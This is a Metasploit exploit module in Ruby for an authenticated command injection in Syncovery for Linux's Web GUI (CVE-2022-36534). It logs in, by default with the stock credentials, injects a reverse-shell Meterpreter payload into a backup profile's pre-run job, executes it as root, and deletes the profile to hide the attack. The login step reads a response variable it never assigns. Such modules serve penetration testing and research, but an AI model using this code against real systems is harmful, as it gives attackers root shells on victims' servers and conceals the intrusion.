##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Syncovery For Linux Web-GUI Authenticated Remote Command Execution',
        'Description' => %q{
          This module exploits an authenticated command injection vulnerability in the Web GUI of Syncovery File Sync & Backup Software for Linux.
          Successful exploitation results in remote code execution under the context of the root user.

          Syncovery allows an authenticated user to create jobs, which are executed before/after a profile is run.
          Jobs can contain arbitrary system commands and will be executed as root.
          A valid username and password or a session token is needed to exploit the vulnerability.
          The profile will be deleted afterwards to disguise the attack. IOC_IN_LOGS are present, but can be deleted manually.

          The vulnerability is known to work on Linux platforms. All Syncovery versions prior to v9.48j are vulnerable including all versions of branch 8.
        },
        'Author' => [ 'Jan Rude' ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://www.mgm-sp.com/en/multiple-vulnerabilities-in-syncovery-for-linux/'],
          ['CVE', '2022-36534']
        ],
        'Platform' => 'unix',
        'Arch' => [ ARCH_CMD ],
        'Targets' => [
          ['Syncovery for Linux < 9.48j', {}]
        ],
        'Privileged' => true,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'DisclosureDate' => '2022-09-06',
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 8999,
          'Payload' => 'cmd/unix/python/meterpreter/reverse_tcp',
          'SSL' => false
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8999), # Default is HTTP: 8999; HTTPS: 8943
        OptString.new('USERNAME', [true, 'The username to Syncovery (default: default)', 'default']),
        OptString.new('PASSWORD', [true, 'The password to Syncovery (default: pass)', 'pass']),
        OptString.new('TOKEN', [false, 'A valid session token', '']),
        OptString.new('TARGETURI', [true, 'The path to Syncovery', '/']),
      ]
    )
  end

  def check
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, '/get_global_variables'),
      'method' => 'GET'
    )
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to host - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Error (response code: #{res.code})") if res.code != 200

    if res.code == 200
      if res.body.scan(/"isSyncoveryLinux":"true"/).flatten[0] || res.body.scan(/"isSyncoveryWindows":"false"/).flatten[0]
        version = res.body.scan(/"SyncoveryTitle":"Syncovery\s([A-Za-z0-9.]+)/).flatten[0] || ''
        if version.empty?
          vprint_warning("#{rhost}:#{rport} - Could not identify version")
          Exploit::CheckCode::Detected
        elsif Rex::Version.new(version) < Rex::Version.new('9.48j')
          vprint_good("#{rhost}:#{rport} - Syncovery #{version}")
          Exploit::CheckCode::Vulnerable
        else
          vprint_status("#{rhost}:#{rport} - Syncovery #{version}")
          Exploit::CheckCode::Safe
        end
      else
        Exploit::CheckCode::Safe
      end
    end
  rescue Rex::ConnectionError
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to host")
  end

  def exploit
    token = datastore['TOKEN']
    if token.blank?
      send_request_cgi({
        'uri' => normalize_uri(target_uri.path, '/post_applogin.php'),
        'vars_get' => {
          'login' => datastore['USERNAME'].to_s,
          'password' => datastore['PASSWORD'].to_s
        },
        'method' => 'GET'
      })

      unless res
        fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to authentication request")
      end

      # After login, the application should give us a new token
      # session_token is actually just base64(MM/dd/yyyy HH:mm:ss) at the time of the login
      token = res.body.scan(%r{"session_token":"((?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?)"}).flatten[0] || ''
      if token.blank?
        fail_with(Failure::NoAccess, "#{peer} - Invalid credentials!")
      else
        vprint_good("#{rhost}:#{rport} - Login successful")
      end
    end

    # send payload
    profile_name = Rex::Text.rand_text_alpha_lower(20)
    json_body = {
      'ProfileName' => profile_name,
      'Action' => 'Insert',
      'FormName' => 'synapp_profile_editor_form',
      'token' => token,
      'Name' => profile_name,
      'LeftPath' => '/dev/null',
      'RightPath' => '/dev/null',
      'Job_ExecuteBefore' => payload.encoded
    }
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/post_profilesettings.php'),
      'headers' => {
        'X-Requested-With' => 'XMLHttpRequest',
        'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8'
      },
      'data' => JSON.generate(json_body)
    })

    if res && res.code == 200
      if res.body.to_s.include? 'Session Expired'
        fail_with(Failure::UnexpectedReply, "#{peer} - Invalid token (Session Expired)")
      elsif res.body.to_s.include? 'Inserted'
        vprint_good("#{rhost}:#{rport} - Profile created")
      else
        fail_with(Failure::UnexpectedReply, "#{peer} - Error (#{res.body})")
      end
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Error (response code: #{res.code})")
    end

    vprint_status("#{rhost}:#{rport} - Running profile")
    json_body = {
      'ProfileName' => profile_name,
      'token' => token,
      'attended' => true
    }
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/post_runprofile.php'),
      'data' => JSON.generate(json_body)
    })

    if res && res.code == 200
      print_good("#{rhost}:#{rport} - Exploit successfully executed")
      handler
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Could not run profile (response code: #{res.code})")
    end

    # Delete profile to disguise attack in Web GUI
    sleep_time = rand(4..10)
    sleep(sleep_time)
    vprint_status("#{rhost}:#{rport} - Trying to delete profile")
    json_body = {
      'ProfileName' => profile_name,
      'token' => token
    }
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/post_deleteprofile.php'),
      'data' => JSON.generate(json_body)
    })

    if res && res.code == 200 && (res.body.to_s.include? 'Deleted')
      vprint_good("#{rhost}:#{rport} - Profile successfully deleted")
    else
      print_error("#{rhost}:#{rport} - Could not delete profile (#{res.body})")
    end
  end

end
